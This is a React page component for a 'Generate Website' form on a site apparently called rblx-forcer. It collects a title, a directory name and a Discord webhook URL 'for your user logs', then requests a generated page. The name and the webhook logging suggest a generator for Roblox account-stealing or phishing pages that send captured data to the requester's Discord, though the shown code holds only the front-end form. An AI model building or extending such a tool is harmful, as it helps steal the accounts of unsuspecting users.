import { useState } from "react";

export default function Home() {
  const [title, setTitle] = useState("");
  const [directory, setDirectory] = useState("");
  const [webhookUrl, setWebhookUrl] = useState("");
  const [message, setMessage] = useState("");
  const [loading, setLoading] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!title || !directory || !webhookUrl) {
      setMessage("⚠️ Please fill in all fields.");
      return;
    }

    setLoading(true);
    setMessage("");

    try {
      const res = await fetch("/api/submit", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ title, directory, webhookUrl }),
      });

      const data = await res.json();
      if (data.success) {
        setMessage(`✅ ${data.message}\n🔗 Visit: ${data.url}`);
        setTitle("");
        setDirectory("");
        setWebhookUrl("");
      } else {
        setMessage(`❌ ${data.message}`);
      }
    } catch (error) {
      console.error("Error submitting form:", error);
      setMessage("❌ Something went wrong while submitting.");
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex flex-col items-center justify-center bg-gray-900 text-white p-6">
      <div className="max-w-md w-full bg-gray-800 rounded-2xl shadow-lg p-8 space-y-6">
        <h1 className="text-3xl font-bold text-center text-blue-400">
          Generate Website
        </h1>

        <form onSubmit={handleSubmit} className="space-y-5">
          <div>
            <label className="block text-sm font-medium mb-1">Title</label>
            <input
              type="text"
              placeholder="My Awesome Site"
              value={title}
              onChange={(e) => setTitle(e.target.value)}
              className="w-full px-4 py-2 rounded-lg bg-gray-700 text-white border border-gray-600 focus:outline-none focus:ring-2 focus:ring-blue-500"
            />
          </div>

          <div>
            <label className="block text-sm font-medium mb-1">
              Directory Name
            </label>
            <input
              type="text"
              placeholder="example-site"
              value={directory}
              onChange={(e) => setDirectory(e.target.value)}
              className="w-full px-4 py-2 rounded-lg bg-gray-700 text-white border border-gray-600 focus:outline-none focus:ring-2 focus:ring-blue-500"
            />
            <p className="text-xs text-gray-400 mt-1">
              Will create:{" "}
              <span className="text-blue-400">
                https://rblx-forcer.vercel.app/{directory || "your-directory"}
              </span>
            </p>
          </div>

          <div>
            <label className="block text-sm font-medium mb-1">
              Webhook URL
            </label>
            <input
              type="text"
              placeholder="https://discord.com/api/webhooks/..."
              value={webhookUrl}
              onChange={(e) => setWebhookUrl(e.target.value)}
              className="w-full px-4 py-2 rounded-lg bg-gray-700 text-white border border-gray-600 focus:outline-none focus:ring-2 focus:ring-blue-500"
            />
            <p className="text-xs text-gray-400 mt-1">
              Webhook for your user logs
            </p>
          </div>

          <button
            type="submit"
            disabled={loading}
            className={`w-full py-3 mt-4 rounded-lg font-semibold transition ${
              loading
                ? "bg-gray-600 cursor-not-allowed"
                : "bg-blue-500 hover:bg-blue-600"
            }`}
          >
            {loading ? "Generating..." : "Generate Website"}
          </button>
        </form>

        {message && (
          <div
            className={`mt-4 text-center whitespace-pre-wrap ${
              message.startsWith("✅")
                ? "text-green-400"
                : message.startsWith("❌")
                ? "text-red-400"
                : "text-yellow-400"
            }`}
          >
            {message}
          </div>
        )}
      </div>

      <footer className="mt-10 text-sm text-gray-500">
        © {new Date().getFullYear()} rblx-forcer.vercel.app | 24/7 Generator
      </footer>
    </div>
  );
}
